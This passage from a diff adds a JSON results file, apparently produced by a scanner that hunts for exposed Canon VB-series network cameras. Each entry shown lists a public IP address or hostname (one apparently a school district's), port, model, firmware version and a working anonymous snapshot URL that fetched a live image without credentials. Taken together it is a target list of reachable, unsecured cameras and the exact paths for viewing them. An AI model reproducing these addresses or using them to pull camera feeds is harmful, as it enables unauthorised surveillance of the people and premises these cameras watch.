+          "url": "http://210.237.44.45:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 28288,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://210.237.44.45:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "109.90.49.50:81": {
+    "host": "109.90.49.50",
+    "port": 81,
+    "url": "http://109.90.49.50:81/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://109.90.49.50:81/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 11337,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H41 Ver. 1.3.1",
+      "model": "VB-H41",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://109.90.49.50:81/-wvhttp-01-/getoneshot?image=img"
+  },
+  "210.153.76.199:80": {
+    "host": "210.153.76.199",
+    "port": 80,
+    "url": "http://210.153.76.199:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://210.153.76.199:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 7301,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.1.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://210.153.76.199:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "208.65.66.50:8020": {
+    "host": "208.65.66.50",
+    "port": 8020,
+    "url": "http://208.65.66.50:8020/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://208.65.66.50:8020/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 18853,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.0.3",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://208.65.66.50:8020/-wvhttp-01-/getoneshot?image=img"
+  },
+  "211.6.231.85:80": {
+    "host": "211.6.231.85",
+    "port": 80,
+    "url": "http://211.6.231.85:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://211.6.231.85:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 19372,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.0.2",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://211.6.231.85:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "98.175.114.134:8888": {
+    "host": "98.175.114.134",
+    "port": 8888,
+    "url": "http://98.175.114.134:8888/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://98.175.114.134:8888/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 17117,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://98.175.114.134:8888/-wvhttp-01-/getoneshot?image=img"
+  },
+  "195.165.183.74:80": {
+    "host": "195.165.183.74",
+    "port": 80,
+    "url": "http://195.165.183.74:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://195.165.183.74:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 200526,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H43 Ver. 1.2.9",
+      "model": "VB-H43",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://195.165.183.74:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "210.237.44.35:80": {
+    "host": "210.237.44.35",
+    "port": 80,
+    "url": "http://210.237.44.35:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://210.237.44.35:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 14388,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.2.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://210.237.44.35:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "98.175.114.133:8888": {
+    "host": "98.175.114.133",
+    "port": 8888,
+    "url": "http://98.175.114.133:8888/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://98.175.114.133:8888/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 23655,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.2",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://98.175.114.133:8888/-wvhttp-01-/getoneshot?image=img"
+  },
+  "65.19.231.17:80": {
+    "host": "65.19.231.17",
+    "port": 80,
+    "url": "http://65.19.231.17:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://65.19.231.17:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 20594,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.0.2",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://65.19.231.17:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "125.199.233.198:80": {
+    "host": "125.199.233.198",
+    "port": 80,
+    "url": "http://125.199.233.198:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://125.199.233.198:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 4950,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://125.199.233.198:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "24.226.131.114:8019": {
+    "host": "24.226.131.114",
+    "port": 8019,
+    "url": "http://24.226.131.114:8019/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://24.226.131.114:8019/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 7633,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H41 Ver. 1.3.1",
+      "model": "VB-H41",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://24.226.131.114:8019/-wvhttp-01-/getoneshot?image=img"
+  },
+  "162.252.89.116:80": {
+    "host": "162.252.89.116",
+    "port": 80,
+    "url": "http://162.252.89.116:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://162.252.89.116:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 5198,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.0.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://162.252.89.116:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "153.156.10.95:80": {
+    "host": "153.156.10.95",
+    "port": 80,
+    "url": "http://153.156.10.95:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://153.156.10.95:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 5767,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.2.5",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://153.156.10.95:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "153.142.207.159:80": {
+    "host": "153.142.207.159",
+    "port": 80,
+    "url": "http://153.142.207.159:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://153.142.207.159:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 34330,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.0.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://153.142.207.159:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "122.103.109.254:8080": {
+    "host": "122.103.109.254",
+    "port": 8080,
+    "url": "http://122.103.109.254:8080/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://122.103.109.254:8080/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 27689,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://122.103.109.254:8080/-wvhttp-01-/getoneshot?image=img"
+  },
+  "162.252.89.115:80": {
+    "host": "162.252.89.115",
+    "port": 80,
+    "url": "http://162.252.89.115:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://162.252.89.115:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3560,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.1.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://162.252.89.115:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "192.173.155.111:80": {
+    "host": "192.173.155.111",
+    "port": 80,
+    "url": "http://192.173.155.111:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://192.173.155.111:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 14672,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.1",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://192.173.155.111:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "124.143.25.100:80": {
+    "host": "124.143.25.100",
+    "port": 80,
+    "url": "http://124.143.25.100:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://124.143.25.100:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 3557,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-S805D Ver. 1.0.0",
+      "model": "VB-S805D",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://124.143.25.100:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "47.51.131.147:80": {
+    "host": "47.51.131.147",
+    "port": 80,
+    "url": "http://47.51.131.147:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://47.51.131.147:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 7421,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.2.5",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://47.51.131.147:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "125.199.217.57:8001": {
+    "host": "125.199.217.57",
+    "port": 8001,
+    "url": "http://125.199.217.57:8001/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://125.199.217.57:8001/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 52075,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.2.5",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://125.199.217.57:8001/-wvhttp-01-/getoneshot?image=img"
+  },
+  "153.142.207.155:80": {
+    "host": "153.142.207.155",
+    "port": 80,
+    "url": "http://153.142.207.155:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://153.142.207.155:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 31343,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.0.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://153.142.207.155:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "110.3.251.231:80": {
+    "host": "110.3.251.231",
+    "port": 80,
+    "url": "http://110.3.251.231:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://110.3.251.231:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 108185,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H43 Ver. 1.2.0",
+      "model": "VB-H43",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://110.3.251.231:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "166.139.38.142:2200": {
+    "host": "166.139.38.142",
+    "port": 2200,
+    "url": "http://166.139.38.142:2200/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://166.139.38.142:2200/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 73263,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://166.139.38.142:2200/-wvhttp-01-/getoneshot?image=img"
+  },
+  "125.170.186.237:8015": {
+    "host": "125.170.186.237",
+    "port": 8015,
+    "url": "http://125.170.186.237:8015/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://125.170.186.237:8015/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 7031,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.1.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://125.170.186.237:8015/-wvhttp-01-/getoneshot?image=img"
+  },
+  "diocam.bssd.org:80": {
+    "host": "diocam.bssd.org",
+    "port": 80,
+    "url": "http://diocam.bssd.org:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://diocam.bssd.org:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 4385,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-C10R Ver. 3.0.26",
+      "model": "VB-C10R",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://diocam.bssd.org:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "114.179.39.86:80": {
+    "host": "114.179.39.86",
+    "port": 80,
+    "url": "http://114.179.39.86:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://114.179.39.86:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 59807,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H41 Ver. 1.3.1",
+      "model": "VB-H41",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://114.179.39.86:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "180.43.97.69:8080": {
+    "host": "180.43.97.69",
+    "port": 8080,
+    "url": "http://180.43.97.69:8080/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://180.43.97.69:8080/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 39861,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H43 Ver. 1.0.0",
+      "model": "VB-H43",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://180.43.97.69:8080/-wvhttp-01-/getoneshot?image=img"
+  },
+  "166.144.167.20:80": {
+    "host": "166.144.167.20",
+    "port": 80,
+    "url": "http://166.144.167.20:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://166.144.167.20:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 109964,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-S30D Ver. 1.3.3",
+      "model": "VB-S30D",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://166.144.167.20:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "166.167.73.68:80": {
+    "host": "166.167.73.68",
+    "port": 80,
+    "url": "http://166.167.73.68:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://166.167.73.68:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 65749,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H43 Ver. 1.2.9",
+      "model": "VB-H43",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://166.167.73.68:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "218.45.5.70:80": {
+    "host": "218.45.5.70",
+    "port": 80,
+    "url": "http://218.45.5.70:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://218.45.5.70:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 6229,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M40 Ver. 1.2.0",
+      "model": "VB-M40",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://218.45.5.70:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "115.179.36.89:80": {
+    "host": "115.179.36.89",
+    "port": 80,
+    "url": "http://115.179.36.89:80/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://115.179.36.89:80/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 4521,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-M42 Ver. 1.1.0",
+      "model": "VB-M42",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://115.179.36.89:80/-wvhttp-01-/getoneshot?image=img"
+  },
+  "167.20.30.176:1050": {
+    "host": "167.20.30.176",
+    "port": 1050,
+    "url": "http://167.20.30.176:1050/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://167.20.30.176:1050/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
+          "label": "WV-HTTP-JPEG-Default",
+          "content_type": "image/jpeg",
+          "size": 19796,
+          "is_image": true
+        }
+      }
+    ],
+    "success": true,
+    "findings": {
+      "is_vb_cam": true,
+      "anon_streams_count": 1,
+      "version": "VB-H41 Ver. 1.3.1",
+      "model": "VB-H41",
+      "internal_ip": "",
+      "auth_required_count": 1
+    },
+    "auth_method": "anonymous_wvhttp",
+    "auth_user": "",
+    "auth_pass": "",
+    "anon_url": "http://167.20.30.176:1050/-wvhttp-01-/getoneshot?image=img"
+  },
+  "118.243.56.46:8001": {
+    "host": "118.243.56.46",
+    "port": 8001,
+    "url": "http://118.243.56.46:8001/viewer/live/index.html?lang=en",
+    "methods_tried": [
+      {
+        "method": "anon_wvhttp",
+        "result": {
+          "url": "http://118.243.56.46:8001/-wvhttp-01-/getoneshot?image=img",
+          "path": "/-wvhttp-01-/getoneshot?image=img",
